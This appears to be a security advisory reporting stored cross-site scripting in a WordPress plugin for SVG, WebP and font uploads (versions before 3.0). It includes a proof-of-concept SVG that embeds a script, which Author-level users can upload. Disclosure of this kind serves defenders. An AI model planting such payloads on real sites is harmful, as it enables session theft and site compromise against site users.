# CITS Support svg, webp Media and TTF,OTF File Upload < 3.0 - Author+ Stored XSS via SVG

### Description

The plugin does not sanitise uploaded SVG files, which could allow users with a role as low as Author to upload a malicious SVG containing XSS payloads.

### Proof of Concept

As an author, upload an SVG with the payload:
```
<svg xmlns="http://www.w3.org/2000/svg">
<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
<script type="text/javascript">alert("xss");</script>
</svg>
```
View the SVG and see the XSS.

### Affects Plugins
